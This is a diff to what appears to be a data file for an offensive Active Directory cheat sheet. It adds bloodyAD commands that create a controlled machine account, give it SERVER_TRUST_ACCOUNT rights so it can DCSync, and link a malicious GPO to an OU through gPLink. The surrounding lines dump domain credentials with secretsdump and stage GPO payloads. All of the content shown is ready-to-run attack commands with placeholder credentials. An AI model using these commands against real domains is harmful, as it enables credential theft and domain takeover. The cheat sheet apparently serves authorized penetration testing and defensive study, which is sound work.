@@ -78,10 +78,13 @@ misc::memssp`, lang: 'powershell' },
     tools: [
       { name: 'Powermad', url: 'https://github.com/Kevin-Robertson/Powermad' },
       { name: 'addcomputer (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
     ],
     commands: [
       { label: 'Create a controlled machine account', code: r`New-MachineAccount -MachineAccount Pentestlab -Domain domain.local -DomainController dc.domain.local`, lang: 'powershell' },
       { label: 'Make the machine account a DC (DA required)', code: r`Set-ADComputer Pentestlab -replace @{ "userAccountControl" = 8192 }`, lang: 'powershell' },
+      { label: 'Create a controlled machine account (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add computer Pentestlab 'ComputerPass123!'`, lang: 'bash' },
+      { label: 'Flag it SERVER_TRUST_ACCOUNT so it can DCSync (bloodyAD, DA/write needed)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add uac 'Pentestlab$' -f SERVER_TRUST_ACCOUNT`, lang: 'bash' },
       { label: 'DCSync as the machine account', code: r`secretsdump.py 'domain.local/Pentestlab$:Password123@dc01' -just-dc`, lang: 'bash' },
     ],
     mitre: mitre('T1136.002'),
@@ -239,10 +242,12 @@ sekurlsa::logonpasswords`, lang: 'powershell' },
     tools: [
       { name: 'pyGPOAbuse', url: 'https://github.com/Hackndo/pyGPOAbuse' },
       { name: 'OUned.py', url: 'https://github.com/synacktiv/OUned' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
     ],
     commands: [
       { label: 'Stage a payload in a controllable GPO', code: r`pygpoabuse.py domain.local/user -hashes :<NTHASH> -gpo-id <GPO-GUID>`, lang: 'bash' },
       { label: 'Link the GPO to the target OU (PowerView)', code: r`New-GPLink -Name 'Evil GPO' -Target 'OU=Servers,DC=domain,DC=local'`, lang: 'powershell' },
+      { label: 'Write gPLink to link the GPO to the OU (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object 'OU=Servers,DC=domain,DC=local' gPLink -v '[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=domain,DC=local;0]'`, lang: 'bash' },
     ],
     mitre: mitre('T1484.001'),
     references: [
